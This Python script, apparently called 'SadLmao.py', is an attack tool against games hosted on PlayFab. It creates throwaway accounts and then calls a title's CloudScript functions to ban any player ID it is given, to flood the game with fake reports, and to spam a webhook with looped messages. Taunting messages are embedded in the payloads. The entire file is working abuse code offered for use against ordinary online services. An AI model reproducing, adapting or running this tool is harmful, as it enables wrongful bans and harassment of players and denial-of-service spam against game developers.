import requests
import os
import time
import random
import string
import base64

# readable list of cities, originally encoded for obfuscation
cities = [
    'New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'San Francisco',
    'Dallas', 'Austin', 'San Diego', 'Seattle', 'Miami', 'Denver', 'Boston',
    'Nashville', 'Portland', 'Atlanta', 'Washington', 'Las Vegas',
    'Minneapolis', 'Cleveland', 'Charlotte'
]

# get a session ticket using a random customId
def get_session_ticket(title_id):
    custom_id = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    headers = {'Content-Type': 'application/json'}
    payload = {
        'TitleId': title_id,
        'CustomId': custom_id,
        'CreateAccount': True
    }
    res = requests.post(f'https://{title_id}.playfabapi.com/Client/LoginWithCustomID', json=payload, headers=headers)
    return res.json()['data']['SessionTicket']

# loading animation
def show_loading():
    for i in range(3):
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Loading' + '.' * (i + 1))
        time.sleep(0.5)

# banner print
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' SadLmao.py')
    print(' ANONYMOUS')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' Options:')
    print(' [1] 🔨 Ban User')
    print(' [2] 📋 Spam Reports')
    print(' [3] 💀 Spam Webhook')
    print(' [4] 🧨 Exit')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# main menu logic
def menu(title_id):
    while True:
        banner()
        option = input('Choose an option: ').strip()
        if option == '1':
            player_id = input('PlayerId: ')
            session = get_session_ticket(title_id)
            headers = {
                'X-Authorization': session,
                'Content-Type': 'application/json'
            }
            payload = {
                'FunctionName': 'ThroughMessage',
                'FunctionParameter': {
                    'msg': 'WE FKED SOMEONE```:skull:',
                    'rsn': 'targeted by anonymous LOL',
                    'pli': player_id
                }
            }
            res = requests.post(f'https://{title_id}.playfabapi.com/Client/ExecuteCloudScript', json=payload, headers=headers)
            if 'Error' not in res.json().get('data', {}):
                print(f'Banned {player_id} in {title_id}')
            else:
                print(f'Failed to ban {player_id}')
            input('Press Enter to go back...')
        elif option == '2':
            amount = int(input('Amount: '))
            session = get_session_ticket(title_id)
            headers = {
                'X-Authorization': session,
                'Content-Type': 'application/json'
            }
            for _ in range(amount):
                payload = {
                    'FunctionName': 'report',
                    'FunctionParameter': {
                        'reason': '**```targeted by anonymous```**',
                        'target': f'**```PLAYFAB TITLE ID -> {title_id}\ntargeted by anonymous```**',
                        'playerdoing': f'**```PLAYFAB TITLE ID -> {title_id}\ntargeted by anonymou```**',
                        'todo': 'EMPTY'
                    }
                }
                requests.post(f'https://{title_id}.playfabapi.com/Client/ExecuteCloudScript', json=payload, headers=headers)
            input('Press Enter to go back...')
        elif option == '3':
            amount = int(input('Amount: '))
            message = input('Message: ')
            session = get_session_ticket(title_id)
            headers = {
                'X-Authorization': session,
                'Content-Type': 'application/json'
            }
            for _ in range(amount):
                payload = {
                    'FunctionName': 'IsOnline',
                    'FunctionParameter': {
                        'whatever': message
                    }
                }
                requests.post(f'https://{title_id}.playfabapi.com/Client/ExecuteCloudScript', json=payload, headers=headers)
            input('Press Enter to go back...')
        elif option == '4':
            print('Exiting...')
            break
        else:
            print('Invalid option. Try again.')
            time.sleep(1)

# entrypoint
if __name__ == '__main__':
    title_id = input('Enter the PlayFab Title ID: ').strip()
    show_loading()
    menu(title_id)
